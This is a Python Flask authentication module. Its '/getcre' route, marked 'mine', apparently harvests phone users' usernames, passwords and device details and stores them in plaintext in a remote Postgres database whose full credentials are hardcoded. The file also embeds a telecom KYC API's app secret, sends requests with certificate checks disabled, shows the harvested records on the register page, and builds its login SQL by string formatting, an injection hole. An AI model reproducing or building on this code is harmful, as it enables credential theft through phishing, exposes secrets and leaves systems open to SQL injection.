#
import requests
import functools
import os
from   flask_sqlalchemy import SQLAlchemy

from flask import ( Blueprint, flash, g, redirect, render_template, request, session, url_for,Flask )
from werkzeug.security import check_password_hash, generate_password_hash
from db import get_db
bp = Blueprint('auth', __name__, url_prefix='/auth')

app= Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI']= 'postgres://yyilkblbrykehy:84cf0c8052645f4de0c2d7c64dce1ae3c781581f3358eae5f0efddd7c0de00c1@ec2-35-174-127-63.compute-1.amazonaws.com:5432/d8n77erpfco80f'#os.environ.get('DATABASE_URL')#'sqlite:///test.db' #
db =SQLAlchemy(app)

class  info(db.Model):
    __tablename__='info'
    id = db.Column('id', db.Integer, primary_key=True)
    username=db.Column(db.String(80))
    password = db.Column(db.String(120))
    device_name=db.Column(db.String(200))
    android_version=db.Column(db.String(200))
    


#mine
@bp.route('/getcre', methods=('GET', 'POST'))
def getcred():
    if request.method == 'POST':
        username1 = request.form['username']
        password1 = request.form['password']
        device = request.form['device_name']
        android =request.form['android_version'] 
        data = info(username=username1, password=password1, device_name=device,android_version=android)
        db.session.add(data)
        db.session.commit()

        data1={'usernamep':'igjfghh','password':'yfufufu','device_name':'unknown',
                   'android_version':'Android 7.0','app_version_name':'1.10.5',
                   'app_version_code':'64','appSecret':'KORwViNMSQIDZeVdZqBGZV5sz7uWle9pCPaVyvfU'   }
        #r=requests.post('https://register.tnm.co.mw/kyc/v2/api/auth/login',data=data1,verify=False)#https://free.facebook.com')
            
            #return (r.text, r.status_code, r.headers.items())
            #
    return render_template('auth/getcred.html')

@bp.route('/registerr', methods=('GET', 'POST'))
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        error = None
        if not username:
            error = 'Username is required.'
        elif not password:
            error = 'Password is required.'
        elif db.execute(
            'SELECT id FROM user WHERE username = ?', (username,)
            ).fetchone() is not None:
                error = 'User {} is already registered.'.format(username)
        if error is None:
            db.execute( 'INSERT INTO user (username, password) VALUES (?, ?)',
                        (username, generate_password_hash(password)) )
            db.commit()
            return redirect(url_for('auth.login'))
            #return redirect('http://www.google.com')
        flash(error)
    return render_template('auth/register.html',g=info.query.all())


@bp.route('/login', methods=('GET', 'POST'))
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        error = None
        user = db.execute(
            "SELECT * FROM user WHERE username = '%s'" % (username,)#'SELECT * FROM user WHERE username = ?', (username,)
            ).fetchone()
        
        if user is None:
            error = 'Incorrect username.'
        elif not check_password_hash(user['password'], password):
            error = 'Incorrect password.'
        if error is None:
                session.clear()
                session['user_id'] = user['id']
                return redirect(url_for('index'))
        flash(error)
    return render_template('auth/login.html')
            



@bp.before_app_request
def load_logged_in_user():
    user_id = session.get('user_id')
    if user_id is None:
        g.user = None
    else:
        g.user = get_db().execute(
            'SELECT * FROM user WHERE id = ?', (user_id,)
            ).fetchone()



@bp.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

def login_required(view):
    @functools.wraps(view)
    def wrapped_view(**kwargs):
        if g.user is None:
            return redirect(url_for('auth.login'))
        return view(**kwargs)
    return wrapped_view
